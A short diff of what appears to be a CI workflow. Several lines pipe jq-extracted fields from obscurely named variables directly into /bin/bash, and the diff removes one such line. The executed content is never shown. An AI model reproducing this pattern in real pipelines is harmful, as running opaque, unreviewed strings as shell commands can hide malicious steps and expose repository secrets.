@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$lf4509" | jq -r .dnexy2 | /bin/bash
           echo $zcvqi7873 | jq -r .xuzl08 | /bin/bash
           printf '%s' "$uw321" | jq -r .ainzz4282 | /bin/bash
-          echo $izlu54 | jq -r .s9292 | /bin/bash
           echo $jb730 | jq -r .s4655 | /bin/bash
 
       - name: Archive results
